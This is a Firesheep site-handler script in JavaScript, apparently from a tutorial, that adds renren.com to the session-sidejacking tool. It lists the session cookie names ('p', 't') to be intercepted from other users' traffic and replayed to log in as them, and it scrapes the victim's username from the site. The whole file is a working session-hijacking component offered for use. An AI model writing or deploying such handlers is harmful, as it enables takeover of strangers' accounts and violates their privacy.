// Authors:
//   Eric Butler <eric@codebutler.com>
//   Ian Gallagher <crash@neg9.org>
    register({  
    // FOR http://www.renren.com/  
      name: 'renren.com', //the name that will show up in the Firesheep sidebar  
      url: 'http://www.renren.com/', //the website url that Firesheep will match on  
      domains: [ 'renren.com' ], //the actual domain that Firesheep will look for in the request  
      sessionCookieNames: [ 'p', 't' ], //a list of cookie key names that firesheep will intercept and send on   
                                                                         //your behalf (this should be the list of cookies you noted in the previous step)  
      identifyUser: function() { //Firesheep can make a request to discover some information about the cookie (username and avatar) for the buddy list  
        var site = this.httpGet(this.siteUrl); //this will pull down a page that contains the value for the username and avatar  
       this.userName = site.body.querySelector('a.name').innerHTML; //use a query selector to pull out the username from the page (optional)  
       // this.userAvatar = resp.body.querySelector('div.figure').src; //another query selector to grab the image (optional)   
      }  
    });  
